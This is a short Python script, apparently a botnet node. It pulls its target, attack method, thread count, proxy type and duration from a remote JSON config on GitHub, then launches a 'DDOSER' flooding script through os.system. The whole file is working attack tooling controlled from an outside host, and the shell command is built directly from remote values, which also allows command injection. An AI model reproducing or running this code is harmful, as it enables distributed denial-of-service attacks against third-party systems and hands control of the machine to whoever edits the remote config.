import json
import requests
import os
#os.system('pip install -r requirements.txt')
CONFIG_FILE = 'https://raw.githubusercontent.com/DenysDanov/botnet/main/cfg.json'
req = requests.get(CONFIG_FILE).json()
TARGET = req["base"]["target"]
METHOD = req["base"]["method"]
THREADS = req["base"]["threads"]
SOCKS_TYPE = req["base"]["socks_type"]
DURATION = req["base"]["duration"]

print(f'TARGET: {TARGET}\nMETHOD: {METHOD}\nTHREADS: {THREADS}')
os.system(f'python DDOSER/start.py {METHOD} {TARGET} {THREADS} {DURATION} {SOCKS_TYPE} socks{SOCKS_TYPE}.txt')